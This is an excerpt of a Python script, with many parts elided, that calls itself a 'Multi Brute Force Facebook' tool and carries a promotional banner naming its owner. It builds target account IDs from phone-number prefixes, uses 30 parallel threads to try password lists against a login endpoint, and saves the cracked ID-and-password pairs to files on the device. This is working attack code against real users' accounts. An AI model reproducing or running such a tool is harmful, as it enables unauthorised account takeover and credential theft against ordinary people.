...
def logo():
    ...
    print(f"""{white}
               ...
               ࿐NOMAN BALOCH࿐
      YP  YP  YP YP   YP 88   YD Y888888P    {green}(ALLAH{white}  """)                                                                                 
    print(50*'-')
    prit(f" {white}{green}[~]{white} Owner     : NOMAN BALOCH ")
   print(f" {white}{green}[~]{white} Facebook  : Noman Baloch ")
    print(f" {white}{green}[~]{white} Tool      : Multi Brute Force Facebook ")
    print(f" {white}{green}[~]{white} Whatsapp  : 03420291131 Only Paid Promotion ")
...
def random_number():
    ...
    with ThreadPool(max_workers=30) as AQSABALOCHID:
        ...
        for user in user_ID:
            uid = code+user
            AQSABALOCHID.submit(bapi,uid,pwx,total)
    print(50*"-")
...
def bapi(uid,pwx,total):
    ...
    try:
        ...
        first6digit = uid[0:6]
        fullnumber = uid
        sys.stdout.write(f'\r\r[{green}NOM-AN{white}] {len(cracked)}\{total} - {green}{len(oks)}{white}\{rad}{len(cps)}{white} ');sys.stdout.flush()
        for pw in pwx:
            ...
            if 'session_key' in responce_json:
                ...
                if uidX not in oks:
                    print(f'\r{green}[NOMAN-OK] {uidX} | {pw} {white}')
                    open('/sdcard/NOMAN-OK.txt', 'a').write(uidX+'|'+pw+'\n')
                    oks.append(uidX)
            elif responce_json['error_code'] == 405:
                if uid not in cps:
                    print(f'\r{rad}[NOMAN-CP] {uid}     | {pw} {white}')
                    open('/sdcard/NOMAN-CP.txt', 'a').write(uid+'|'+pw+'\n')
                    cps.append(uid)
            else:continue
        cracked.append(uid)
    ...
    try:
        ...
        for pw in pwx:
            ...
            if 'session_key' in responce_json:
                ...
                if uid not in oks:
                    print(f'\r{green}[NOMAN-OK] {uid} | {pw} {white}')
                    open('/sdcard/NOMAN-OK.txt', 'a').write(uid+'|'+pw+'\n')
                    oks.append(uid)
...
if __name__=="__main__":
     infinty()
     #bapif("100093508036648|AQSA BALOCH id",["4292416"],"2222")
